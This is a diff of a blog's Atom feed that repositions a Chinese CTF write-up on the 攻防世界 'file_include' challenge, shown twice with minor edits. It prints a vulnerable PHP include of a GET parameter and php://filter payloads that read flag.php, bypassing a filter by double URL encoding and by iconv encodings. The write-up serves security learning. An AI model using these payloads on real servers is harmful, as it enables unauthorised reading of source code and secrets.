@@ -42,31 +42,6 @@
   </entry>
   
   <entry>
-    <title>攻防世界-file_include</title>
-    <link href="http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-file_include/"/>
-    <id>http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-file_include/</id>
-    <published>2022-12-13T16:00:00.000Z</published>
-    <updated>2022-12-14T17:32:46.243Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感觉挺开心的。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./check.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>明显是文件包含，get型传参</p><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>首先按照标准的获取文件内容方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.base64-encode/resource=check.php</span><br></pre></td></tr></table></figure><p>执行后发现显示：do not hack!<br>这是配置了WAF，于是我们需要弄清楚哪里被过滤并且寻找绕过方式。</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>我们可以尝试在各个字段中添加1来破坏完整性，通过在ba1se64-en1code我们可知是base64和encode被过滤了。<br>于是需要想办法绕过base64和encode来达到目的。</p><h3 id="第1种方法"><a href="#第1种方法" class="headerlink" title="第1种方法"></a>第1种方法</h3><p><strong>二次编码URL绕过</strong><br>我们只需将as和nc连续编码两次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字符第1次第2次</span><br><span class="line">as %61%73%2561%2573</span><br><span class="line">nc %63%6f%2563%256f</span><br></pre></td></tr></table></figure><p>用第二次编码后的字符替换掉原来的字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.b%2561%2573e64-en%2563%256fde/resource=flag.php</span><br></pre></td></tr></table></figure><p>得到flag</p><h3 id="第2种方法"><a href="#第2种方法" class="headerlink" title="第2种方法"></a>第2种方法</h3><p><em><em>convert.iconv.</em> 绕过</em>*<br>这个过滤器需要php支持iconv，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。<br>iconv — 字符串按要求的字符编码来转换<br>convery.iconv.*的使用有两种方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line">or </span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure><p>列举部分编码方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UCS-4*UCS-4BE UCS-4LE*  UCS-2  UCS-2BE  UCS-2LE  UTF-32*  UTF-32BE*  UTF-32LE*  UTF-16*  UTF-16BE*  UTF-16LE*  UTF-7  UTF7-IMAP  UTF-8*  ASCII*  EUC-JP*  SJIS*  eucJP-win*  SJIS-win*  ISO-2022-JP  ISO-2022-JP-MS  CP932  CP51932  BASE64</span><br></pre></td></tr></table></figure><p>更多可参考<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a><br>经过多次尝试，最终找到了其中一种编码绕过方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>没有直接看答案做出的题还是让人蛮高兴的。又学习到了一点。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Zero_Adam/article/details/116170568">base64 的编码小trick</a><br><a href="https://blog.csdn.net/yuanxu8877/article/details/127607264">攻防世界web-file_include</a></p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;感觉挺开心的。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
-    
-    <category term="文件包含" scheme="http://example.com/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
-    
-    
-    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
-    
-    <category term="文件包含" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
-    
-  </entry>
-  
-  <entry>
     <title>攻防世界-baby_web</title>
     <link href="http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-baby_web/"/>
     <id>http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-baby_web/</id>
@@ -86,6 +61,31 @@
     
     
     <category term="CTF" scheme="http://example.com/tags/CTF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>攻防世界-file_include</title>
+    <link href="http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-file_include/"/>
+    <id>http://example.com/2022/12/14/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-file_include/</id>
+    <published>2022-12-13T16:00:00.000Z</published>
+    <updated>2022-12-14T17:38:25.458Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>感觉挺开心的。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./check.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>明显是文件包含，get型传参</p><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>首先按照标准的获取文件内容方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.base64-encode/resource=check.php</span><br></pre></td></tr></table></figure><p>执行后发现显示：do not hack!<br>这是配置了WAF，于是我们需要弄清楚哪里被过滤并且寻找绕过方式。</p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>我们可以尝试在各个字段中添加1来破坏完整性，通过在ba1se64-en1code我们可知是base64和encode被过滤了。<br>于是需要想办法绕过base64和encode来达到目的。</p><h3 id="第1种方法"><a href="#第1种方法" class="headerlink" title="第1种方法"></a>第1种方法</h3><p><strong>二次编码URL绕过</strong><br>我们只需将as和nc连续编码两次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字符第1次第2次</span><br><span class="line">as %61%73%2561%2573</span><br><span class="line">nc %63%6f%2563%256f</span><br></pre></td></tr></table></figure><p>用第二次编码后的字符替换掉原来的字符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter/convert.b%2561%2573e64-en%2563%256fde/resource=flag.php</span><br></pre></td></tr></table></figure><p>得到flag</p><h3 id="第2种方法"><a href="#第2种方法" class="headerlink" title="第2种方法"></a>第2种方法</h3><p><strong>convert.iconv.* 绕过</strong><br>这个过滤器需要php支持iconv，而iconv是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。<br>iconv — 字符串按要求的字符编码来转换<br>convery.iconv.*的使用有两种方法:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; </span><br><span class="line">or </span><br><span class="line">convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;</span><br></pre></td></tr></table></figure><p>列举部分编码方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UCS-4*UCS-4BE UCS-4LE*  UCS-2  UCS-2BE  UCS-2LE  UTF-32*  UTF-32BE*  UTF-32LE*  UTF-16*  UTF-16BE*  UTF-16LE*  UTF-7  UTF7-IMAP  UTF-8*  ASCII*  EUC-JP*  SJIS*  eucJP-win*  SJIS-win*  ISO-2022-JP  ISO-2022-JP-MS  CP932  CP51932  BASE64</span><br></pre></td></tr></table></figure><p>更多可参考<a href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a><br>经过多次尝试，最终找到了其中一种编码绕过方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>没有直接看答案做出的题还是让人蛮高兴的。又学习到了一点。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Zero_Adam/article/details/116170568">base64 的编码小trick</a><br><a href="https://blog.csdn.net/yuanxu8877/article/details/127607264">攻防世界web-file_include</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;感觉挺开心的。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
+    
+    <category term="文件包含" scheme="http://example.com/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    
+    
+    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
+    
+    <category term="文件包含" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
     
   </entry>
   
